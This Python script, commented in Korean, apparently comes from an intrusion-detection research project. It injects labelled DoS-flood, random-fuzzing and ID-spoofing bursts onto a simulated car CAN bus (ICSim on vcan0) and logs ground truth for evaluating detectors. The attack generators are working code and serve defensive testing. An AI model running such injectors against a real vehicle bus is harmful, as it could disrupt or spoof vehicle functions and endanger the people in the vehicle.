"""
ICSim(icsim/controls)이 이미 vcan0에 정상 트래픽을 계속 쏘고 있는 상태에서,
그 위에 라벨링된 공격 버스트를 추가로 주입. ground truth 기록.

사용법: python3 22_icsim_attack_inject.py [지속시간(초), 기본 90]
"""
import can, time, random, pickle, os, sys, csv, atexit, importlib.util

HERE = os.path.dirname(__file__)
DURATION = int(sys.argv[1]) if len(sys.argv) > 1 else 90
CHANNEL = "vcan0"

with open(os.path.join(HERE, "..", "models", "icsim_stats.pkl"), "rb") as f:
    STATS = pickle.load(f)
known_ids = sorted(STATS["known_ids"])
id_byte_stats = STATS["id_byte_stats"]

spoof_id1 = random.choice(known_ids)
spoof_id2 = random.choice([i for i in known_ids if i != spoof_id1])
dos_id = min(known_ids)

bus = can.interface.Bus(channel=CHANNEL, bustype="socketcan")
atexit.register(bus.shutdown)

# ---------------------------------------------------------
# Independent per-frame attack ground truth
# ---------------------------------------------------------
_gt_spec = importlib.util.spec_from_file_location(
    "icsim_gt_logger",
    os.path.join(HERE, "42_icsim_gt_logger.py")
)
_gt_mod = importlib.util.module_from_spec(_gt_spec)
_gt_spec.loader.exec_module(_gt_mod)

independent_gt_path = os.path.join(
    HERE,
    "..",
    "results",
    "icsim_attack_ground_truth.csv"
)

gt_frame_logger = _gt_mod.AttackGTLogger(
    independent_gt_path
)

atexit.register(gt_frame_logger.close)


def send(cid, payload, attack_type):
    msg = can.Message(
        arbitration_id=cid,
        data=bytes(payload[:8]),
        is_extended_id=False
    )

    # Ground truth is recorded directly by the injector.
    # No IDS feature / score / threshold is used.
    gt_frame_logger.log(
        cid,
        msg.data,
        attack_type
    )

    bus.send(msg)

def inject_dos(t_end):
    while time.time() < t_end:
        send(dos_id, [0, 0, 0, 0, 0, 0, 0, 0], "DoS")
        time.sleep(0.001)

def inject_fuzzy(t_end):
    while time.time() < t_end:
        cid = random.randint(0, 0x7FF)
        pl = [random.randint(0, 255) for _ in range(8)]
        send(cid, pl, "Fuzzy")
        time.sleep(0.003)

def inject_spoof(t_end, cid):
    while time.time() < t_end:
        mu, std = id_byte_stats.get(cid, ([128]*8, [50]*8))
        pl = [int(max(0, min(255, mu[i] + random.choice([-1, 1]) * std[i] * 15))) for i in range(8)]
        send(cid, pl, "spoof")
        time.sleep(0.01)

ATTACKS = [
    ("DoS", inject_dos, None),
    ("Fuzzy", inject_fuzzy, None),
    ("spoof1", inject_spoof, spoof_id1),
    ("spoof2", inject_spoof, spoof_id2),
]

print(f"[icsim_attack] dos_id={hex(dos_id)} spoof_id1={hex(spoof_id1)} spoof_id2={hex(spoof_id2)}")
print(f"[icsim_attack] ICSim 백그라운드 정상 트래픽 위에 {DURATION}초간 공격 주입 시작")

gt_path = os.path.join(HERE, "..", "results", "realtime_ground_truth.csv")
os.makedirs(os.path.dirname(gt_path), exist_ok=True)
gt_file = open(gt_path, "w", newline="")
gt_writer = csv.writer(gt_file)
gt_writer.writerow(["start_ts", "end_ts", "label"])

t_start = time.time()
t_finish = t_start + DURATION
next_attack_at = t_start + random.uniform(5, 10)

while time.time() < t_finish:
    now = time.time()
    if now >= next_attack_at:
        label, fn, arg = random.choice(ATTACKS)
        burst_dur = random.uniform(2.0, 4.0)
        a_start = time.time()
        a_end = a_start + burst_dur
        print(f"[icsim_attack] >>> {label} 시작 ({burst_dur:.1f}s)")
        if arg is None:
            fn(a_end)
        else:
            fn(a_end, arg)
        gt_writer.writerow([a_start, a_end, label])
        gt_file.flush()
        print(f"[icsim_attack] <<< {label} 종료")
        next_attack_at = time.time() + random.uniform(5, 10)
    else:
        time.sleep(0.05)

gt_file.close()
print(f"[icsim_attack] 완료. ground truth 저장: {gt_path}")
